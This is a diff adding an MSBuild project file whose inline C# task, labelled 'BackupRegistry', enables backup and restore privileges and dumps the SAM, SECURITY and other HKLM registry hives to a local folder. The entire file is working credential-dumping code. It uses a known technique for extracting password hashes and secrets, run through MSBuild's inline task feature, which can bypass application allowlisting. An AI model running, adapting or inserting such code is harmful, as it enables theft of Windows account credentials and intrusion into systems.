@@ -1,0 +1,166 @@
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <UsingTask
+      TaskName="BackupRegistry"
+      TaskFactory="RoslynCodeTaskFactory"
+      AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll" >
+      <ParameterGroup />
+      <Task>
+        <Using Namespace="System"/>
+        <Using Namespace="System.IO"/>
+        <Using Namespace="System.Runtime.InteropServices"/>
+        <Using Namespace="System.Runtime.CompilerServices"/>
+        <Code Type="Method" Language="cs">
+          <![CDATA[
+
+            [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+            private static extern int RegOpenKeyEx(
+              UIntPtr hKey,
+              string subKey,
+              int ulOptions,
+              REGSAM samDesired,
+              out UIntPtr hkResult);
+
+            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+            static extern int RegSaveKeyA(
+                UIntPtr hKey,
+                string lpFile,
+                IntPtr lpSecurityAttributes
+            );
+            
+	    [DllImport("advapi32.dll", SetLastError = true)]
+	    public static extern int OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);
+
+	    [DllImport("advapi32.dll", SetLastError = true)]
+            public static extern int AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+	    [DllImport("advapi32.dll", SetLastError = true)]
+	    public static extern int LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);
+
+	    [DllImport("kernelbase.dll", SetLastError = true)]
+	    public static extern IntPtr GetCurrentProcess();
+
+	    [StructLayout(LayoutKind.Sequential)]
+	    public struct LUID
+	    {
+		public uint LowPart;
+		public int HighPart;
+	    }
+
+	    [StructLayout(LayoutKind.Sequential)]
+	    public struct TOKEN_PRIVILEGES
+	    {
+		public uint PrivilegeCount;
+		public LUID Luid;
+		public uint Attributes;
+	    }
+
+	    const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+	    const int SE_PRIVILEGE_ENABLED = 0x00000002;
+	    const int TOKEN_QUERY = 0x00000008;
+
+	    static string SE_BACKUP_NAME = "SeBackupPrivilege";
+	    static string SE_RESTORE_NAME = "SeRestorePrivilege";
+            
+            private static UIntPtr HKEY_CLASSES_ROOT = new UIntPtr(0x80000000u);
+            private static UIntPtr HKEY_CURRENT_USER = new UIntPtr(0x80000001u);
+            private static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
+            private static UIntPtr HKEY_USERS = new UIntPtr(0x80000003u);
+            private static UIntPtr HKEY_CURRENT_CONFIG = new UIntPtr(0x80000005u);
+            private static UIntPtr HKEY_DYN_DATA = new UIntPtr(0x80000006u);
+
+	    /*
+            // The key or hive is saved in standard format. The standard format is the only format supported by Windows 2000.
+            private static int REG_STANDARD_FORMAT = 1;
+            // The key or hive is saved in the latest format. The latest format is supported starting with Windows XP. After the key or hive is saved in this format, it cannot be loaded on an earlier system.
+            private static int REG_LATEST_FORMAT = 2;
+            // The hive is saved with no compression, for faster save operations. The hKey parameter must specify the root of a hive under HKEY_LOCAL_MACHINE or HKEY_USERS. For example, HKLM\SOFTWARE is the root of a hive.
+            private static int REG_NO_COMPRESSION = 4;
+	    */
+
+            private enum REGSAM : uint
+            {
+                KEY_QUERY_VALUE = 0x0001,
+                KEY_SET_VALUE = 0x0002,
+                KEY_CREATE_SUB_KEY = 0x0004,
+                KEY_ENUMERATE_SUB_KEYS = 0x0008,
+                KEY_NOTIFY = 0x0010,
+                KEY_CREATE_LINK = 0x0020,
+                KEY_WOW64_64KEY = 0x0100,
+                KEY_WOW64_32KEY = 0x0200,
+                KEY_READ = (KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY),
+                KEY_WRITE = (KEY_SET_VALUE | KEY_CREATE_SUB_KEY),
+                KEY_ALL_ACCESS = KEY_READ | KEY_WRITE | KEY_CREATE_LINK | KEY_WOW64_64KEY | KEY_WOW64_32KEY
+            }
+
+            private string[] Hives = {
+                "OSDATA",
+                "HARDWARE",
+                "SOFTWARE",
+                "SECURITY",
+                "SAM"
+            };
+
+            private static string DUMP_PATH = "D:\\regdump"; 
+
+	    public static void AdjustTokenPrivs()
+	    {
+		LUID RestoreLuid = new LUID();
+		LUID BackupLuid = new LUID();
+
+		TOKEN_PRIVILEGES TP = new TOKEN_PRIVILEGES();
+		TOKEN_PRIVILEGES TP2 = new TOKEN_PRIVILEGES();
+
+		IntPtr token = IntPtr.Zero;
+		int retval = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref token);
+		retval = LookupPrivilegeValue(null, SE_RESTORE_NAME, ref RestoreLuid);
+		retval = LookupPrivilegeValue(null, SE_BACKUP_NAME, ref BackupLuid);
+
+		TP.PrivilegeCount = 1;
+		TP.Attributes = SE_PRIVILEGE_ENABLED;
+		TP.Luid = RestoreLuid;
+		TP2.PrivilegeCount = 1;
+		TP2.Attributes = SE_PRIVILEGE_ENABLED;
+		TP2.Luid = BackupLuid;
+
+		retval = AdjustTokenPrivileges(token, false, ref TP, 0, IntPtr.Zero, IntPtr.Zero);
+		retval = AdjustTokenPrivileges(token, false, ref TP2, 0, IntPtr.Zero, IntPtr.Zero);
+	    }
+
+            public override bool Execute()
+            {
+                int result = 0;
+                AdjustTokenPrivs();
+
+		if(!Directory.Exists(DUMP_PATH))
+		{
+		    Console.WriteLine($"[*] Creating directory {DUMP_PATH}");
+		    Directory.CreateDirectory(DUMP_PATH);
+		}
+
+                UIntPtr hKey = UIntPtr.Zero;
+                foreach(var hive in Hives)
+                {
+                    Console.WriteLine($"[+] Dumping Hive: {hive}");
+                    result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, hive, 0, REGSAM.KEY_READ, out hKey);
+                    if (result != 0)
+                    {
+                        Console.WriteLine($"[-] Failed to open Hive:{hive}, Error: {result}");
+                        return false;
+                    }
+
+                    string dumpPath = $"{DUMP_PATH}\\{hive}.HIVE";
+
+                    result = RegSaveKeyA(hKey, dumpPath, IntPtr.Zero);
+                    Console.WriteLine($"[*] Hive dump: {hive}, Result: {result} -> {dumpPath}");
+                }
+
+                return true;
+            }
+          ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+    <Target Name="BackupRegistry">
+      <BackupRegistry />
+    </Target>
+  </Project>
